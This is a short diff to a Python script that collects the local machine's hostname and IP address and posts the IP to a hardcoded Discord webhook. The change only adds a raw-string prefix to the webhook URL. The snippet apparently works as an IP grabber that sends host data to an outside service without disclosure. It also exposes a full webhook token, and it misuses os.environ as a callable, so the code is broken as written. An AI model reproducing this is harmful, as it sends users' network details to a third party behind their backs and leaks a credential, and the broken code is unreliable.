@@ -15,7 +15,7 @@ import os
 hostname = socket.gethostname()
 ip_address = socket.gethostbyname(hostname)
 
-DISCORD_WEBHOOK_URL = os.environ("https://discord.com/api/webhooks/1168493250164822036/eiC_S4Jm_op_Q01tPBjFlcQozFoKIbmFDzcx4bZTTQ5d6zzDANT6XmiGIk72qLt3_jIz")
+DISCORD_WEBHOOK_URL = os.environ(r"https://discord.com/api/webhooks/1168493250164822036/eiC_S4Jm_op_Q01tPBjFlcQozFoKIbmFDzcx4bZTTQ5d6zzDANT6XmiGIk72qLt3_jIz")
 payload = {'content': ip_address}
 response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
 
